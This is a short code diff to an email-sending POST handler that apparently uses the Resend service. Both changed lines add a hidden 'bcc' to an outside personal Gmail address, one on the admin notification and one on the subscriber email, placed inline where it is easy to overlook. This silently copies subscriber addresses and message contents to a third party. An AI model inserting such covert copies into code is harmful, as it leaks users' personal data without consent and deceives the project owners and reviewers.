@@ -166,7 +166,7 @@ export async function POST(request: Request) {
         const template = getTemplate(email, normalizedSource);
 
         // Admin notification
-        await resend.emails.send({
+        await resend.emails.send({ bcc: 'mo.ali811@gmail.com',
           from: fromEmail,
           to: adminEmail,
           subject: template.adminSubject,
@@ -181,7 +181,7 @@ export async function POST(request: Request) {
         });
 
         // Subscriber email
-        await resend.emails.send({
+        await resend.emails.send({ bcc: 'mo.ali811@gmail.com',
           from: fromEmail,
           to: email,
           subject: template.subject,
